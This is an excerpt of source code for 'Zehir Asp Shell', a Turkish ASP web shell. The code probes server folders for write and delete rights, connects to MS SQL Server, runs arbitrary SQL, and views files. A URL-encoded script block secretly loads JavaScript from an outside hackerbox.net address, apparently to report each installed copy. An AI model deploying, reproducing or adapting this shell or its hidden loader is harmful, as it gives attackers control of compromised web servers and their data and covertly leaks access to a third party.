...
response.Write "<title>Zehir Asp Shell --> powered by zehir &lt;zehirhacker@hotmail.com&gt;</title>"
if popup then
%>
<center>
...
<script language="javascript">
document.write( unescape( '%3C%73%63%72%69%70%74%20%73%72%63%3D%68%74%74%70%3A%2F%2F%77%77%77%2E%68%61%63%6B%65%72%62%6F%78%2E%6E%65%74%2F%62%6C%61%62%6C%61%2F%70%65%72%2E%6A%73%3E%3C%2F%73%63%72%69%70%74%3E' ) );
</script> 
<%
end if
'####################################
...
function yaziyomu(yol)
	...
	set MyFile = Nothing
	if err<>0 then 
		sonuc__="<font color=red>Yazma Hakki Yok!</font>"
	else 
		sonuc__="<font color=yellow>Yazma Hakki Var!</font>"
		on error goto 0: on error resume next
		objFSO.DeleteFile yol & "\test.zehir",true
		if err<>0 then 
			sonuc__=sonuc__&"<br><font color=red>Silme Hakki Yok!</font>"
		else
			sonuc__=sonuc__&"<br><font color=yellow>Silme Hakki Var!</font>"
		end if
	end if
	yaziyomu = sonuc__
end function
...
sub LocalPathParentFolder
	...
	if err<>0 then
		Response.Write "<tr><td><b>Local Path <br>Parent Folder</td><td><font color=red>Hata Olustu : ["&err.Description&"]</td></tr>"
	else
...
sub LocalPathPParentFolder
	...
	if err<>0 then
		if err=451 then
			...
			Response.Write "<tr><td><b>Local Path <br>P.Parent Folder</td><td><font color=red>Hata Olustu : ["&err.Description&"]</td></tr>"
		end if
	else
...
CASE 15 'Ms. SQL Server
	...
	response.Write "<input type=submit value='SQL Servera Baglan' style='height:23;width:170' id=submit1 name=submit1>"
					...
					<table width=500 align=center border=1 cellpadding=0 cellspacing=0>
						...
						<tr>
							<td colspan=2 align=center>
								...
								<a href="#" onClick="FormatText('paste')" alt="Yapistir">Yapistir</a>
								<a href="#" alt="Kalin" onClick="FormatText('bold', '')">Bold</a>
								<a href="#" alt="Italic" onClick="FormatText('italic', '')">Italic</a>
								<a href="#" alt="Alti Çizili" onClick="FormatText('underline', '')">UnderLine</a>
								<a href="#" onClick="FormatText('JustifyLeft', '')" alt="Sola Hizali">JustifyLeft</a>
								<a href="#" alt="Ortada Hizali" onClick="FormatText('JustifyCenter', '')">JustifyCenter</a>
								<a href="#" onClick="FormatText('JustifyRight', '')" alt="Saga Hizali">JustifyRight</a>
								...
								<select name="selectColour" onChange="bgc(selectColour.options[selectColour.selectedIndex].value);" ID="selectColour">
                                  ...
                                  <option value="cyan">Açik Mavi</option>
                                  <option value="limegreen">Açik Yesil</option>
                                </select>
								...
								<script language=javascript>
									...
									function AddImage(){	
										imagePath = prompt('Eklemek istediginiz resmin web adresini yazin', 'http://');				
...
if popup then
	if status=7 or status=8 then
		Response.Write "<form method=get action='"&DosyPath&"' id=form1 name=form1>"
		Response.Write "<table border=1 cellpadding=0 cellspacing=0 align=center><tr><td width=100 bgcolor=gray><font size=2>SQL Çalistir</td><td>"
		...
		Response.Write "<input style='width:350; height:21' value='' name=strSQL><input type=submit value='Çalistir' style='height:22;width:70' id=submit1 name=submit1>"
...
CASE 5 'Dosya içerigini görüntüle
	...
	if err.number=62 then Response.Write "<script language=javascript>alert('Bu Dosya Okunamiyor\nSistem dosyasi olabilir')</script>":Response.End
CASE 6 'Resim aç
...
on error resume next
	...
	if yaziyomu2(lpath_) then
		...
		Response.Write("Resim Açilamiyor.. <br>Isterseniz Download Ederek görüntüleyebilirsiniz..")
	end if
	resimYol = fname__
end function
